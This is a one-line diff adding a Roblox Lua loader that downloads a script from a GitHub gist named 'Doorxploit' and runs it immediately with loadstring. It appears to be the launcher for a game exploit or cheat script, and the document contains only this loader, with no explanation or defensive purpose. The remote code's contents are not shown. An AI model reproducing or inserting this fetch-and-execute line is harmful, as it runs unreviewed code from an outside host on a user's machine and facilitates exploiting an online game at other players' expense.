@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://gist.githubusercontent.com/ewaswdw/534abf24f3ea2a70eb815125d652d451/raw/7c8d3b53d5fa84d9b2f7c86fd67461d186b52f59/Doorxploit')()
